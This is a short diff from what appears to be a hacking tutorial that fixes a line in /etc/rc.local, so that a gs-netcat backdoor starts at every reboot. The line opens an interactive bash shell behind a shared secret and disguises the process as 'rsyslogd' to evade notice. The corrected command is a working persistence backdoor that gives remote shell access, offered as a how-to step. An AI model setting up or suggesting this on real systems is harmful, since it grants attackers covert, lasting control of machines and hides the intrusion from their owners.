@@ -192,7 +192,7 @@ Combine what you have learned so far and make your backdoor restart after reboot
 $ cat /etc/rc.local
 #! /bin/bash
 
-(GSOCKET_ARGS="-s MySecret -liqD" SHELL="/bin/bash exec" -a rsyslogd /usr/local/bin/gs-netcat)
+(GSOCKET_ARGS="-s MySecret -liqD" SHELL="/bin/bash" exec -a rsyslogd /usr/local/bin/gs-netcat)
 
 exit 0
 ```
